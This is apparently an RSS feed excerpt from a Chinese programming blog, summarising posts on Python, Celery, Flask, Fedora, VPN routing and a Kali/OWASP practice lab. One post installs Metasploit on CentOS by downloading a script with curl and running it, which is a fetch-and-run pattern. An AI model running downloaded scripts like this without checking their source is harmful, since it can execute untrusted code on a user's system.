      <guid>/posts/virtualbox%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%92%E9%80%9A%E5%90%8C%E6%97%B6%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91/</guid>
      <description>&lt;p&gt;对于爱好网络安全而又不想非法入侵的小伙伴来说，VirtualBOX可是神器级别的工具，这里记录一下我是怎么配置网络使虚拟机之间可以互通同时可以通过物理机访问外网的。&lt;/p&gt;
&lt;p&gt;第一台虚拟机是kali linux，启动之前需要在设置中启用2块网卡，&lt;strong&gt;第一块网卡设置为“Internal Network”，第二块设置为&amp;quot;Bridged Adapter&amp;rdquo;&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;第二台是OWASP提供的漏洞测试虚拟机镜像，基于ubuntu的系统，&lt;strong&gt;第一块网卡设置为“Internal Network”即可&lt;/strong&gt;。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python中闭包示例</title>
      <link>/posts/python%E4%B8%AD%E9%97%AD%E5%8C%85%E7%A4%BA%E4%BE%8B/</link>
      <pubDate>Fri, 18 Mar 2016 11:44:58 +0000</pubDate>
      
      <guid>/posts/python%E4%B8%AD%E9%97%AD%E5%8C%85%E7%A4%BA%E4%BE%8B/</guid>
      <description>&lt;p&gt;概念上的东西这里就不详细解释了，为什么需要闭包（Closures）呢？个人理解就是某些情况下你需要在外部访问函数内部的变量时，闭包就该大显身手了。闭包的一种典型表现就是函数内部定义了新的函数。这里举几个例子以记录使用闭包时的几个注意点，例子来源于&lt;a href=&#34;http://coolshell.cn/articles/6731.html&#34;&gt;这里&lt;/a&gt;，大神用javascript写的示例，这里改成python的，也顺便说说遇到的坑。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>名词王国里的死刑（翻译）</title>
      <link>/posts/%E5%90%8D%E8%AF%8D%E7%8E%8B%E5%9B%BD%E9%87%8C%E7%9A%84%E6%AD%BB%E5%88%91%E7%BF%BB%E8%AF%91/</link>
      <pubDate>Wed, 16 Mar 2016 17:02:02 +0000</pubDate>
      
      <guid>/posts/%E5%90%8D%E8%AF%8D%E7%8E%8B%E5%9B%BD%E9%87%8C%E7%9A%84%E6%AD%BB%E5%88%91%E7%BF%BB%E8%AF%91/</guid>
      <description>&lt;p&gt;真是惭愧，直到今日才读到这篇文章，原文在&lt;a href=&#34;http://steve-yegge.blogspot.hk/2006/03/execution-in-kingdom-of-nouns.html&#34;&gt;这里&lt;/a&gt;。我本人大学课程中唯一没选修的语言就是Java，不知什么原因对于Java就是不感冒。虽然由于某些原因做了一阵android的开发，但是这段经历更是让我坚定了“能不写java程序就不写java程序”的想法。这里无意引起“语言之战”，仅是个人喜好问题罢了。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>解决flower Substantial drift from.. may mean clocks are out of sync错误</title>
      <link>/posts/%E8%A7%A3%E5%86%B3flower-substantial-drift-from-may-mean-clocks-are-out-of-sync%E9%94%99%E8%AF%AF/</link>
      <pubDate>Wed, 24 Feb 2016 14:27:30 +0000</pubDate>
      
      <guid>/posts/%E8%A7%A3%E5%86%B3flower-substantial-drift-from-may-mean-clocks-are-out-of-sync%E9%94%99%E8%AF%AF/</guid>
      <description>打开flower的监控页面，发现monitor页的succeeded tasks图表始终为空，打印日志发现有下面的警告：
[2016-02-24 12:00:21,799: WARNING/MainProcess] celery@localhost.localdomain ready.[2016-02-24 12:00:22,297: WARNING/MainProcess] Substantial drift from celery@centos7-181 may mean clocks are out of sync.</description>
    </item>
    
    <item>
      <title>Django&#43;Celery&#43;Rabbitmq&#43;Flower使用小记</title>
      <link>/posts/django-celery-rabbitmq-flower%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</link>
      <pubDate>Tue, 23 Feb 2016 15:30:02 +0000</pubDate>
      
      <guid>/posts/django-celery-rabbitmq-flower%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</guid>
      <description>&lt;p&gt;之前的博客中简单的介绍了celery的安装配置以及如何在python程序中使用，这里记录一下我使用django结合celery以及rabbitmq提供web服务，同时使用flower进行监控的过程。至于这几样东西是什么、怎么安装这里就不再细说了。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python基础复习之使用字典分派函数</title>
      <link>/posts/python%E5%9F%BA%E7%A1%80%E5%A4%8D%E4%B9%A0%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%AD%97%E5%85%B8%E5%88%86%E6%B4%BE%E5%87%BD%E6%95%B0/</link>
      <pubDate>Tue, 26 Jan 2016 11:57:39 +0000</pubDate>
      
      <guid>/posts/python%E5%9F%BA%E7%A1%80%E5%A4%8D%E4%B9%A0%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%AD%97%E5%85%B8%E5%88%86%E6%B4%BE%E5%87%BD%E6%95%B0/</guid>
      <description>&lt;p&gt;程序中很常见的一种场景就是根据某个控制变量的值来调用不同的函数或对象进行处理，某些语言中可以使用case语句进行处理，在python可以使用getattr函数甚至if&amp;hellip;elif&amp;hellip;else来处理，除此之外，也可以使用字典来实现相同的功能，比如下面的例子：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;animals &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
number_of_felines &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;deal_cat&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; number_of_felines
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;meow&amp;#34;&lt;/span&gt;
    animals&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;feline&amp;#39;&lt;/span&gt;)
    number_of_felines &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;deal_dog&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bark&amp;#39;&lt;/span&gt;
    animals&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;canine&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;deal_bear&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hug&amp;#34;&lt;/span&gt;
    animals&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ursine&amp;#39;&lt;/span&gt;)
token &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;: deal_cat, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;: deal_dog, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bear&amp;#39;&lt;/span&gt;: deal_bear}
&lt;span style=&#34;color:#75715e&#34;&gt;#words = [&amp;#39;cat&amp;#39;, &amp;#39;dog&amp;#39;, &amp;#39;bear&amp;#39;]&lt;/span&gt;
words &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bear&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; one &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; words:
    token[one]()
    &lt;span style=&#34;color:#75715e&#34;&gt;#return token[one]()&lt;/span&gt;
nf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; number_of_felines
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;we met &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; feline&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (nf, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt;[nf &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:])
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;the animals we net were:&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(animals)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>celery使用小记</title>
      <link>/posts/celery%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</link>
      <pubDate>Thu, 21 Jan 2016 12:32:12 +0000</pubDate>
      
      <guid>/posts/celery%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</guid>
      <description>&lt;p&gt;之前的博客有关于celery以及相关概念的介绍，不过那篇文章没有具体的使用示例，今天补充一下。&lt;/p&gt;
&lt;p&gt;目前celery的版本是&lt;a href=&#34;http://docs.celeryproject.org/en/latest/getting-started/first-steps-with-celery.html#first-steps&#34;&gt;3.1.19&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;这里我使用rabbitmq作为broker以及banckend。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>关于functools.wraps的作用</title>
      <link>/posts/%E5%85%B3%E4%BA%8Efunctools-wraps%E7%9A%84%E4%BD%9C%E7%94%A8/</link>
      <pubDate>Tue, 12 Jan 2016 13:38:44 +0000</pubDate>
      
      <guid>/posts/%E5%85%B3%E4%BA%8Efunctools-wraps%E7%9A%84%E4%BD%9C%E7%94%A8/</guid>
      <description>今天看代码时候有这么一段：
from functools import wrapsdef http_basic_auth(func):&amp;#39;&amp;#39;&amp;#39;定义httpbasicauth装饰器&amp;#39;&amp;#39;&amp;#39;@wraps(func)def _decorator(request, *args, **kwargs):authorization = request.</description>
    </item>
    
    <item>
      <title>你好，2016！</title>
      <link>/posts/%E4%BD%A0%E5%A5%BD2016/</link>
      <pubDate>Sun, 03 Jan 2016 14:26:24 +0000</pubDate>
      
      <guid>/posts/%E4%BD%A0%E5%A5%BD2016/</guid>
      <description>从13年开始写博客，居然已经过了整整3年，自己都没想到能坚持这么久。虽然有些时候一个月只写一篇，但都是自己原创或者翻译的，也是对自己成长记录。按照以往的惯例，这篇文章应该是发布在1月1日的，但今年我竟然稀里糊涂的把这事记错了，以为农历新年时才写总结……
一句话形容2015：平凡而又充实的一年。
全年共阅读21本书，体重也终于上升到了59kg左右，至于收益率的目标……遇到了千股跌停的奇观基本也就达成一半。购物的、娱乐的倒是全部完成了，锻炼又是练练就断了，记账坚持的不错，如果每月能有点结余就更好了，真是收入多了支出也多了。
剩下的……嗯，把2015年目标改成2016年吧……
2015年最有成就感的：
 自驾去海边，走的沿海山路，各种急弯各种坡路啊！以前坐车的时候感觉在山路上看海好美，可自己开车时候根本没办法去欣赏唉…… 新的数据中心、计算中心、网站上线，其中各种曲折就不说了。  2015年最难过的：</description>
    </item>
    
    <item>
      <title>flask-socketio中文文档</title>
      <link>/posts/flask-socketio%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/</link>
      <pubDate>Tue, 29 Dec 2015 16:18:34 +0000</pubDate>
      
      <guid>/posts/flask-socketio%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/</guid>
      <description>&lt;p&gt;官网在&lt;a href=&#34;https://flask-socketio.readthedocs.org/en/latest/&#34;&gt;这里&lt;/a&gt;，英语好的直接去看官网文档吧，我是英语渣只能翻译个大概;另外注意本文翻译时间，可能你看到的时候官网已经更新了。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;flask-socketio赋予了flask程序支持服务端和客户端间双向低延迟通讯的能力，客户端可以使用 &lt;a href=&#34;http://socket.io/&#34;&gt;SocketIO&lt;/a&gt; 库或任何支持与服务端建立长链接的兼容库。&lt;/p&gt;
&lt;h2 id=&#34;安装&#34;&gt;安装&lt;/h2&gt;
&lt;p&gt;可以直接使用pip安装：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pip install flask-socketio
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;依赖&#34;&gt;依赖&lt;/h2&gt;
&lt;p&gt;自从1.0版开始，这个扩展完全兼容了python2.7和python3.3+版本。异步服务的支持基于下面3个选择中的一个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://eventlet.net/&#34;&gt;eventlet&lt;/a&gt; 是3个选项中性能最高的，同时支持长轮循(long-polling)和WebSocket。&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.gevent.org/&#34;&gt;gevent&lt;/a&gt; 是在以前版本中使用的框架，支持长轮循，如果想支持WebSocket的话需要同时安装&lt;a href=&#34;https://pypi.python.org/pypi/gevent-websocket/&#34;&gt;gevent-websocket&lt;/a&gt; 库。使用gevent和gevent-websocket结合性能也不错，但略低于eventlet。&lt;/li&gt;
&lt;li&gt;flask 基于Werkzeug的开发服务也能用，不过性能上不如上面2个选项，所以它应该只用于开发时使用。这个选项只支持长轮循。
本扩展将自动检测哪些异步框架被安装，默认首选eventlet，其次是gevent，最后是flask自带的开发服务。
对于客户端来说，可以使用官方的Socket.Io来建立于服务端的链接，也有使用swift和c++写成的客户端。非官方的客户端也能工作，只要它实现了&lt;a href=&#34;https://github.com/socketio/socket.io-protocol&#34;&gt;Socket.IO&lt;/a&gt; 协议。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;目前的局限&#34;&gt;目前的局限&lt;/h2&gt;
&lt;p&gt;目前flask-socketio只能同时运行在单个进程中（这里应该指的是一个进程中仅能存在一个实例的意思，而非只能开启一个进程吧&amp;hellip;），解决这个限制的工作正在进行中。
（关于升级变化、以及从老版本迁移到新版的注意事项我就不翻译了，因为没用过老版本）&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>centos7安装Metasploit框架</title>
      <link>/posts/centos7%E5%AE%89%E8%A3%85metasploit%E6%A1%86%E6%9E%B6/</link>
      <pubDate>Mon, 28 Dec 2015 17:56:42 +0000</pubDate>
      
      <guid>/posts/centos7%E5%AE%89%E8%A3%85metasploit%E6%A1%86%E6%9E%B6/</guid>
      <description>Metasploit应该不用多说了吧？Kali自带、Win和Mac都提供了现成的安装包，不过我莫名的对apt系不感冒，这里记录一下在centos7上安装metasploit框架的步骤，理论上yum系的都应该通用。 首先执行
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstallchmod 755 msfinstall./msfinstall然后安装postgresql：</description>
    </item>
    
    <item>
      <title>python脚本模拟tail命令</title>
      <link>/posts/python%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%8B%9Ftail%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Tue, 22 Dec 2015 16:00:29 +0000</pubDate>
      
      <guid>/posts/python%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%8B%9Ftail%E5%91%BD%E4%BB%A4/</guid>
      <description>今天有个需求，需要实时监控nginx日志中某些ip的访问情况。如果ip较少的话，直接使用tail、grep以及管道配合即可。不过需要监控100个左右的ip并进行相应处理的话，除了自己写脚本还真没想到别的办法。
首先引出Python中自带的2个函数：
 file.seek(off, whence=0) 从文件中移动off个操作标记（文件指针），正往结束方向移动，负往开始方向移动。如果设定了whence参数，就以whence设定的起始位为准，0代表从头开始，1代表当前位置，2代表文件最末尾位置。 file.tell() 返回文件指针的当前位置。  那么思路就比较清晰了，写一个死循环，循环内记录指针位置并赋值给seek函数：</description>
    </item>
    
    <item>
      <title>fedora21无缝升级到23</title>
      <link>/posts/fedora21%E6%97%A0%E7%BC%9D%E5%8D%87%E7%BA%A7%E5%88%B023/</link>
      <pubDate>Tue, 24 Nov 2015 17:36:16 +0000</pubDate>
      
      <guid>/posts/fedora21%E6%97%A0%E7%BC%9D%E5%8D%87%E7%BA%A7%E5%88%B023/</guid>
      <description>今天看到消息说在12月1号后，fedora将停止对21及以前版本的yum源中软件的更新、新增，作为一个“尝鲜爱好者”当然必须使用最新版的软件了，于是决定对fedora进行升级，目前版本是21，直接升级到23。注意，本文只适用于21,22进行升级，而20及以前的版本命令是fedup而非dnf。
首先执行：
sudo dnf updatesudo dnf system-upgrade download --releasever 23经过漫长的等待后：</description>
    </item>
    
    <item>
      <title>django性能分析</title>
      <link>/posts/django%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/</link>
      <pubDate>Fri, 20 Nov 2015 18:13:57 +0000</pubDate>
      
      <guid>/posts/django%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/</guid>
      <description>一般情况我们使用django-debug-toolbar就能够看到每个步骤的耗时等信息，不过如果需要调试某个接口就不那么直观了，这种情况下我们可以使用下面的中间件来解决问题：
# Orignal version taken from http://www.djangosnippets.org/snippets/186/ # Original author: udfalkso # Modified by: Shwagroo Team and Gun.</description>
    </item>
    
    <item>
      <title>MacOS读写ntfs格式硬盘</title>
      <link>/posts/macos%E8%AF%BB%E5%86%99ntfs%E6%A0%BC%E5%BC%8F%E7%A1%AC%E7%9B%98/</link>
      <pubDate>Sat, 17 Oct 2015 12:04:27 +0000</pubDate>
      
      <guid>/posts/macos%E8%AF%BB%E5%86%99ntfs%E6%A0%BC%E5%BC%8F%E7%A1%AC%E7%9B%98/</guid>
      <description>系统OS X 10.11，之前就有发现ntfs格式的移动硬盘在mac上只能读不能写，通俗点说就是不能保存文件。
总体而言解决方法不外乎4种：
 硬盘在Mac上格式化成ExFAT这种通用格式 安装第三方插件，比如Paragon NTFS for MAC（收费） 安装osxfuse+ntfs-3g（命令行） 修改配置文件打开原生支持方法  首先硬盘里有东西就把第一种方式排除了，缺钱也不想用破解版的第二种也排除，虽说mac也是类unix系统不过看网上改的文件内容也不是特别明白原理排除，所以使用第三种方式吧。</description>
    </item>
    
    <item>
      <title>suds库使用小记</title>
      <link>/posts/suds%E5%BA%93%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</link>
      <pubDate>Wed, 14 Oct 2015 12:11:38 +0000</pubDate>
      
      <guid>/posts/suds%E5%BA%93%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</guid>
      <description>虽说接触过的大部分接口都是以restfullapi的形式返回json数据,但最近有些接口是soap的,如果只是需要一个python的soap客户端的话,suds库是十分不错的一个选择,文档
使用pip安装即可,最基础的使用方法如下,示例来源官网:
from suds.client import Clienturl = &amp;#39;http://localhost:7080/webservices/WebServiceTestBean?wsdl&amp;#39;client = Client(url)print clientSuds - version: 0.</description>
    </item>
    
    <item>
      <title>解决SSL InsecurePlatformWarning问题</title>
      <link>/posts/%E8%A7%A3%E5%86%B3ssl-insecureplatformwarning%E9%97%AE%E9%A2%98/</link>
      <pubDate>Tue, 13 Oct 2015 16:26:12 +0000</pubDate>
      
      <guid>/posts/%E8%A7%A3%E5%86%B3ssl-insecureplatformwarning%E9%97%AE%E9%A2%98/</guid>
      <description>最近使用requests库进行操作时总出现如下警告:
InsecurePlatformWarning: A true SSLContext object is not available. This prevents urllib3 from configuring SSL appropriately and may cause certain SSL connections to fail.</description>
    </item>
    
    <item>
      <title>fedora21架设minecraft服务器</title>
      <link>/posts/fedora21%E6%9E%B6%E8%AE%BEminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Thu, 17 Sep 2015 23:58:41 +0000</pubDate>
      
      <guid>/posts/fedora21%E6%9E%B6%E8%AE%BEminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>上周刚刚从dota2的坑中跳出来，这周就又跳入了mincraft的大坑中。作为买不起官网服务的穷人，自己玩单机也未免过于孤单。虽然网上有很多现成的“私服”，不过又不想受别人限制，那就自己搭建一个呗！
首先安装jdk，fedora执行： sudo yum install java-1.8.0-openjdk.x86_64 ubuntu则是： suso apt-get install openjdk-7-jre-headless 安装完成后可以执行java命令看是否成功，然后下载minecraft的服务端：</description>
    </item>
    
    <item>
      <title>fedora21使用ipv6访问google</title>
      <link>/posts/fedora21%E4%BD%BF%E7%94%A8ipv6%E8%AE%BF%E9%97%AEgoogle/</link>
      <pubDate>Mon, 14 Sep 2015 18:41:37 +0000</pubDate>
      
      <guid>/posts/fedora21%E4%BD%BF%E7%94%A8ipv6%E8%AE%BF%E9%97%AEgoogle/</guid>
      <description>有传言ss、goagent作者被喝茶，不知真假，不过github上的项目确实被删除了，照这趋势大中华局域网指日可待啊。
项目删除并不代表不能使用，如果你有好的ss、goagent服务端fq依然是没太大问题的。不过我最近用ss自己搭建的服务端经常出现时不时就断线的情况，不知道是不是GFW又升级了？作为一个google重度用户，这实在是难以忍受，而且某些情况下又不能直接使用vpn，之前有研究过使用ipv6访问google，但那时候各种fq方法都还不会受到严重干扰，也就没深入了解。ipv6访问google并不是神码新鲜玩意，几年之前就说有朝一日ipv6将取代ipv4，不过喊了几年也没什么动静。原理和废话不多说，想使用ipv6访问google，fedora21默认已经启用了ipv6支持，ubuntu还需要设置一下，具体操作自行百度。然后需要安装miredo： sudo yum install miredo
然后 使用root权限 执行：/usr/local/sbin/miredo
执行后会发现多出一个虚拟网卡：</description>
    </item>
    
    <item>
      <title>python-memcached源码小窥</title>
      <link>/posts/python-memcached%E6%BA%90%E7%A0%81%E5%B0%8F%E7%AA%A5/</link>
      <pubDate>Thu, 13 Aug 2015 18:47:40 +0000</pubDate>
      
      <guid>/posts/python-memcached%E6%BA%90%E7%A0%81%E5%B0%8F%E7%AA%A5/</guid>
      <description>以前经常使用python-memcached对内存进行操作，但应用都比较简单，最近需要有一个分布式缓存系统于是看了看关于twemproxy 以及 mcrouter 这两款分别由twitter和facebook开源的软件文档。这2个软件都能容易的扩展缓存节点以及自动删除问题节点，并且提供不同的算法把数据缓存到各个节点中。这时候我想起来使用python-memcached的时候，也可以使用多个节点，并且某个节点挂掉后并不影响整个缓存程序的使用，那么它是怎么将数据分配到不同的节点呢？以及怎么处理的故障节点呢？ python-memcached的源码只有一个文件，不管是get或者set，取得服务节点Ip的函数如下：
_SERVER_RETRIES = 10 # how many times to try finding a free server.</description>
    </item>
    
    <item>
      <title>flask常用插件</title>
      <link>/posts/flask%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6/</link>
      <pubDate>Tue, 28 Jul 2015 19:27:41 +0000</pubDate>
      
      <guid>/posts/flask%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6/</guid>
      <description>2015-08-28更新 不可否认django是一个功能齐全的、文档最完善的、最容易入门的python框架，但随着业务发展，发现并没有用到django最强大、最方便的后台管理功能。同时相比web.py、flask也确实“重”了一些，所以经过考虑决定将框架换为flask。如果说django是一个组装好的变形金刚，那么flask则是乐高积木，小巧而灵活，可以根据需要选择不同的功能扩展。下面列出了我使用过的一些插件，持续补充&amp;hellip;
flask官网 https://dormousehole.readthedocs.org/en/latest/index.html 这个就不多解释了。
jinja2 http://docs.jinkan.org/docs/jinja2/index.html flask默认模板引擎。
sqlalchemy http://www.sqlalchemy.org/ 如果喜欢用ORM操作数据的话，这个可以说是不错的选择，用来替代django自身提供的ORM系统。</description>
    </item>
    
    <item>
      <title>Fedora21使用vpn翻墙同时访问内网</title>
      <link>/posts/fedora21%E4%BD%BF%E7%94%A8vpn%E7%BF%BB%E5%A2%99%E5%90%8C%E6%97%B6%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91/</link>
      <pubDate>Thu, 16 Jul 2015 12:13:50 +0000</pubDate>
      
      <guid>/posts/fedora21%E4%BD%BF%E7%94%A8vpn%E7%BF%BB%E5%A2%99%E5%90%8C%E6%97%B6%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91/</guid>
      <description>本来用浏览器插件+ss翻墙翻的好好的，结果最近不知道哪里抽风，一访问google就给我跳转到&amp;quot;We are sorry&amp;quot;页面，提示说电脑自动向google发送了一些奇怪的东西，不过使用vpn则没有这个问题。
但使用vpn则无法访问公司内网，关于这点mac上处理的就非常好，当同时使用多个vpn时mac会自动根据访问目标不同而切换不同的vpn线路。既然fedora上没有自动切换功能，但同为的*unix系统肯定是有解决办法的。
目标：使用vpn翻墙同时能访问公司内网
达成目标的核心原理就是路由表，未使用vpn时路由表如下：
Destination Gateway Genmask Flags Metric Ref Use Iface0.</description>
    </item>
    
    <item>
      <title>2015半年度总结</title>
      <link>/posts/2015%E5%8D%8A%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</link>
      <pubDate>Tue, 30 Jun 2015 23:35:41 +0000</pubDate>
      
      <guid>/posts/2015%E5%8D%8A%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;p&gt;今天过去了，2015就过去一半了。年初写计划的日子仿佛就是昨天，看着那一条条年初立下的目标，果然关于买买买和玩玩玩的被率先完成&amp;hellip;&amp;hellip;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>centos6升级docker1.6</title>
      <link>/posts/centos6%E5%8D%87%E7%BA%A7docker1-6/</link>
      <pubDate>Thu, 18 Jun 2015 14:32:59 +0000</pubDate>
      
      <guid>/posts/centos6%E5%8D%87%E7%BA%A7docker1-6/</guid>
      <description>&lt;p&gt;最近饱受Python版本、Django版本、系统不同导致部署方法不同这一类问题的折磨，虽然之前也有接触过docker但一直没抽出时间仔细学习，正好趁这个机会学习docker使用方法。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Selenium&#43;phantomjs模拟网页自动化操作</title>
      <link>/posts/selenium-phantomjs%E6%A8%A1%E6%8B%9F%E7%BD%91%E9%A1%B5%E8%87%AA%E5%8A%A8%E5%8C%96%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Mon, 15 Jun 2015 15:32:11 +0000</pubDate>
      
      <guid>/posts/selenium-phantomjs%E6%A8%A1%E6%8B%9F%E7%BD%91%E9%A1%B5%E8%87%AA%E5%8A%A8%E5%8C%96%E6%93%8D%E4%BD%9C/</guid>
      <description>N久之前使用这对好伙伴实现支持抓取ajax数据的爬虫，最近有个需求是完全模拟某网站的购物操作，结果这个网站比较奇葩，对于表单中某些文本框、复选框等修改后会触发post操作并更改页面内容，而且这些控件之间还会互相影响，直接使用post方式的话比较困难，于是再次祭出神器： selenium 和phantomjs,此外还可以尝试selenium-ide。
这里phantomjs2.0版本并没提供编译好的通用Linux版，所以本文依然使用1.9版，但在2.0版上测试通过。
# coding=utf-8 from selenium import webdriverdef main():dcap = dict(DesiredCapabilities.</description>
    </item>
    
    <item>
      <title>理财记录4</title>
      <link>/posts/%E7%90%86%E8%B4%A2%E8%AE%B0%E5%BD%954/</link>
      <pubDate>Thu, 28 May 2015 23:36:14 +0000</pubDate>
      
      <guid>/posts/%E7%90%86%E8%B4%A2%E8%AE%B0%E5%BD%954/</guid>
      <description>&lt;p&gt;今天主要记录一下关于成长能力和运营能力分析的相关知识，先来看看成长能力。&lt;/p&gt;
&lt;p&gt;作者整体思路是冷眼看待成长能力的，认为靠历史数据预测未来是不靠谱的行为。根据均值回归理论，成长趋势并非可以无限延续，成长股赚的钱是后知后觉者的钱而非企业价值增长赚的钱。&lt;/p&gt;
&lt;p&gt;格雷厄姆给出过一个公式：&lt;/p&gt;
&lt;p&gt;成长股价值=当期（正常）盈余*（8.5+2倍的预期年增长率）&lt;/p&gt;
&lt;p&gt;根据作者给出的数据来看，根据上面公式买入的成长股10年后的收益并不是特别高，反而是根据上面公式买入价值股收益不错。巴菲特在2008年至股东信中阐述了他衡量所投资企业的标准：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;根据行业状况看企业的利润取得怎样的改善&lt;/li&gt;
&lt;li&gt;企业的“护城河”在过去一年内是否有所扩大&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所谓的护城河即企业的竞争优势，作者以2008年万科的数据为例，万科2008年净利润同比下降16.74%，但却因此促成了万科的“合理定价、快速周转、战略纵深到二三线城市”的战略转型，增加了其在同行业中的竞争力，所以当关注的公司在持续增加竞争优势，而某一阶段业绩下滑、股价狂跌，对于价值投资者来说是再好不过的了。&lt;/p&gt;</description>
